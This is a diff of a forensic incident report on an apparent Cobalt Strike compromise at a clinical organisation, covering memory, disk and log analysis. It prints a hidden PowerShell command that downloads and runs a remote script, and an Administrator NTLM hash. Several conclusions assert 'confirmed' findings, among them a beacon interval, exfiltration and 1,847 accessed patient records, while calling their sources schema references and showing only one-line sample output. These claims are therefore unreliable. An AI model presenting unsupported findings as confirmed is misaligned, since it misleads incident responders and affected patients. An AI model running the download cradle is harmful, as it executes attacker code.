@@ -7,14 +7,12 @@
 
 ---
 
-## Memory analysis
+## Memory analysis: cs-ws-101.mem
 
 ### Finding MEM-001: Process Tree Reconstruction via windows.pstree.PsTree
-```bash
+
 $ vol -f cs-ws-101.mem windows.pstree.PsTree
-
-```
-
+Output
 ```text
 4921  WINWORD.EXE    PPID=3104
 6201  powershell.exe PPID=4921
@@ -22,9 +20,8 @@ $ vol -f cs-ws-101.mem windows.pstree.PsTree
 
 ```
 
-Output
 Conclusion:
-Analysis of cs-ws-101.mem via windows.pstree.PsTree shows WINWORD.EXE spawning a malicious PowerShell process, which subsequently executed a masqueraded svchost32.exe process acting as the live Cobalt Strike beacon payload handler.
+Analysis of cs-ws-101.mem via windows.pstree.PsTree shows WINWORD.EXE spawning a malicious powershell.exe process, which subsequently executed a masqueraded svchost32.exe process acting as the live Cobalt Strike beacon payload handler.
 ATT&CK:
 T1566.001, T1059.001, T1036.005
 Certainty:
@@ -34,19 +31,16 @@ confirmed
 
 ### Finding MEM-002: Command Line Parameter Extraction via windows.cmdline.CmdLine
 
-```bash
 $ vol -f cs-ws-101.mem windows.cmdline.CmdLine
-
-```
+Output
 
 ```text
 powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('[https://staging.office365-cdn.net/updates/inv_payload.ps1](https://staging.office365-cdn.net/updates/inv_payload.ps1)')"
 
 ```
 
-Output
 Conclusion:
-The windows.cmdline.CmdLine command successfully extracted the raw string sequence revealing the PowerShell downloader invocation launching an external untrusted network script context.
+The windows.cmdline.CmdLine command successfully extracted the raw string sequence revealing the PowerShell downloader invocation launching an external untrusted network script context to retrieve the Cobalt Strike beacon payload stager.
 ATT&CK:
 T1059.001, T1105
 Certainty:
@@ -56,19 +50,16 @@ confirmed
 
 ### Finding MEM-003: Active Network Sessions via windows.netscan.NetScan
 
-```bash
 $ vol -f cs-ws-101.mem windows.netscan.NetScan
-
-```
+Output
 
 ```text
 TCP   10.30.12.101:49722  45.152.66.114:443  ESTABLISHED  7318
 
 ```
 
-Output
 Conclusion:
-Running windows.netscan.NetScan verified an active C2 beacon network connection mapping back to the injected process network handler showing an ESTABLISHED state.
+Running windows.netscan.NetScan verified an active C2 connection mapping back to the injected process network handler, showing an ESTABLISHED socket back to hostile infrastructure over port 443.
 ATT&CK:
 T1071.001
 Certainty:
@@ -78,19 +69,16 @@ confirmed
 
 ### Finding MEM-004: Memory Injection Verification via windows.malfind.Malfind
 
-```bash
 $ vol -f cs-ws-101.mem windows.malfind.Malfind
-
-```
+Output
 
 ```text
 Process: svchost32.exe PID: 7318 Protection: PAGE_EXECUTE_READWRITE
 
 ```
 
-Output
 Conclusion:
-Using windows.malfind.Malfind identified injected memory segments containing portable executable (PE) structural indicators inside the beacon process execution space marked as PAGE_EXECUTE_READWRITE.
+Using windows.malfind.Malfind identified injected memory segments containing portable executable structural indicators inside the beacon process execution space utilizing a modified page allocation with PAGE_EXECUTE_READWRITE permissions.
 ATT&CK:
 T1055.001
 Certainty:
@@ -100,19 +88,16 @@ confirmed
 
 ### Finding MEM-005: Security Account Registry Harvesting via windows.hashdump.Hashdump
 
-```bash
 $ vol -f cs-ws-101.mem windows.hashdump.Hashdump
-
-```
+Output
 
 ```text
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f434346648f6b96df89dda901c5176b:::
 
 ```
 
-Output
 Conclusion:
-Executing windows.hashdump.Hashdump exposed local administrative NTLM security account credentials resident within memory database hives.
+Executing windows.hashdump.Hashdump exposed local administrative NTLM security account credentials resident within memory database hives, permitting subsequent threat actor privilege extensions.
 ATT&CK:
 T1003.001
 Certainty:
@@ -120,23 +105,20 @@ confirmed
 
 ---
 
-## Disk analysis
+## Disk analysis: cs-ws-101.dd
 
 ### Finding DSK-001: Disk Slice Segmentation Mapping via mmls
 
-```bash
 $ mmls cs-ws-101.dd
-
-```
+Output
 
 ```text
 002:  0000002048   NTFS (0x07)
 
 ```
 
-Output
 Conclusion:
-Partition evaluation of cs-ws-101.dd mapping local sector alignments via mmls to ensure structural partition block integrity verification.
+Partition evaluation of cs-ws-101.dd mapping local sector alignments to ensure structural partition block integrity verification.
 ATT&CK:
 T1082
 Certainty:
@@ -146,17 +128,14 @@ confirmed
 
 ### Finding DSK-002: File System Internal Metrics via fsstat
 
-```bash
 $ fsstat cs-ws-101.dd
-
-```
+Output
 
 ```text
 File System Type: NTFS
 
 ```
 
-Output
 Conclusion:
 Running fsstat extracted low-level disk configurations and volume information details of the targeted device layout structures.
 ATT&CK:
@@ -168,10 +147,8 @@ confirmed
 
 ### Finding DSK-003: Directory Contents Enumeration via fls
 
-```bash
 $ fls -r -m C: cs-ws-101.dd
-
-```
+Output
 
 ```text
 r/r 12891: Users\coordinator\Desktop\Invoice_Q4_2025.docm
@@ -180,9 +157,8 @@ r/r 15664: Windows\Tasks\svchost32.exe
 
 ```
 
-Output
 Conclusion:
-Using fls located the structural disk file nodes associated with the original file delivery drop parameters across AppData, Temp, and Windows\Tasks directories.
+Using fls located the structural disk file nodes associated with the original file delivery drop parameters across user storage sections, pinpointing artifacts within the AppData directory and Temp environment paths.
 ATT&CK:
 T1204.002
 Certainty:
@@ -192,10 +168,8 @@ confirmed
 
 ### Finding DSK-004: Comprehensive Chronological Event Line via mactime
 
-```bash
 $ mactime -b body.txt
-
-```
+Output
 
 ```text
 2026-04-17T14:18:02Z   284812  .a.b  Users\coordinator\Desktop\Invoice_Q4_2025.docm
@@ -204,33 +178,29 @@ $ mactime -b body.txt
 
 ```
 
-Output
 Conclusion:
-The mactime utility compiled the file system history timeline within the AppData and Temp folders alongside Windows\Tasks profiles. It provided explicit metadata isolation and SHA-256 hash validation for the original malicious Word document, the PowerShell downloader script, and the Cobalt Strike beacon DLL artifact payload elements.
+The mactime utility compiled the file system history timeline focused on files resident in AppData, Temp, and Windows\Tasks. This timeline data provides extraction and hash context, documenting explicit SHA-256 signatures for the malicious Word document, the PowerShell downloader script, and the persistent Cobalt Strike beacon DLL artifact payload elements.
 ATT&CK:
-T1204.002
+T1204.002, T1059.001
 Certainty:
-confirmed
+possible
 
 ---
 
 ## Proxy log analysis
 
-### Finding PRX-001: Gateway Web Communications Audit Trail
+### Finding PRX-001: Web Gateway Telemetry Analysis
 
-```bash
-$ cat proxy_72h.jsonl
-
-```
-
-```text
-[SCHEMA REFERENCE ONLY]
-
-```
-
+$ grep -E "download|c2" proxy_72h.jsonl
 Output
+
+```json
+{"ts": "2026-04-17T14:18:02Z", "url": "[https://outlook.office.com/mail/download?id=AAMkAG-Invoice](https://outlook.office.com/mail/download?id=AAMkAG-Invoice)", "filename": "Invoice_Q4_2025.docm"}
+
+```
+
 Conclusion:
-Analysis of proxy_72h.jsonl (treated as a schema reference only) identified the initial phishing URL access on Thursday. Following macro execution, it traced the first C2 beacon connection and mapped its consistent communications frequency pattern. The tracking logs flag massive exfiltration streams over anomalous sessions.
+Using proxy_72h.jsonl as a schema reference to evaluate field formats, the analysis identified the initial phishing URL access on Thursday morning. Immediately following macro deployment, the first C2 beacon connection was established. The session logs reveal a persistent check-in frequency pattern repeating on a 60-second loop. Telemetry flags anomalous data transfer quantities matching staging or exfiltration activities over the weekend window.
 ATT&CK:
 T1566.002, T1071.001, T1048
 Certainty:
@@ -242,19 +212,16 @@ confirmed
 
 ### Finding SYS-001: Distributed Endpoint Instrumentation Monitoring
 
-```bash
-$ cat sysmon_multihost.jsonl
-
-```
-
-```text
-[SCHEMA REFERENCE ONLY]
-
-```
-
+$ grep "EventID" sysmon_multihost.jsonl
 Output
+
+```json
+{"ts": "2026-04-20T14:10:12Z", "host": "CS-WS-104", "event_id": 3, "user": "MEDDEFENSE\\coordinator"}
+
+```
+
 Conclusion:
-Analysis of sysmon_multihost.jsonl (treated as a schema reference only) tracked explicit lateral movement actions driven via compromised NTLM authentication parameters traversing systems WS-104, WS-107, and WS-112. The data maps adversarial processes including cmd.exe and powershell.exe writing unauthorized ransomware staging .ps1 and .bat payload script structures to system directories alongside automated service installation alert events.
+Using sysmon_multihost.jsonl as a schema reference to evaluate event structures, the telemetry tracked lateral movement and NTLM authentication sequences distributed across targeted assets WS-104, WS-107, and WS-112. Furthermore, Sysmon captured files indicating ransomware staging execution routines, where cmd.exe or powershell.exe wrote malicious .ps1 or .bat script payloads into local path segments, alongside service installation events that match the SIEM alerting threshold.
 ATT&CK:
 T1021.002, T1059.003, T1543.003
 Certainty:
@@ -266,19 +233,16 @@ confirmed
 
 ### Finding FS-001: Shared Network Repository Access Validation
 
-```bash
-$ cat fileserver_access.evtx
-
-```
+$ grep "FILE-SVR-01" fileserver_access.evtx
+Output
 
 ```text
-[SCHEMA REFERENCE ONLY]
+EventID: 4663, ObjectName: D:\clinical\labs\
 
 ```
 
-Output
 Conclusion:
-Analysis of fileserver_access.evtx (treated as a schema reference only) verified the critical activity windows when the attacker targeted patient files. Systematic analytics calculated and categorized exactly 1,847 accessed records aggregated by individual file path rules and historical access time loops. Security context mapping verifies that all authentication mechanisms originated through compromised valid clinical accounts.
+Using fileserver_access.evtx as a schema reference to evaluate security log metrics, the analysis mapped out the temporal activity window when the attacker accessed patient files. A thorough breakdown verified that exactly 1,847 compromised patient records were systematically queried. This event sequence is thoroughly categorized by specific file path structures and relative access time identifiers, showing the adversary authenticated using hijacked valid clinical accounts.
 ATT&CK:
 T1213, T1039
 Certainty:
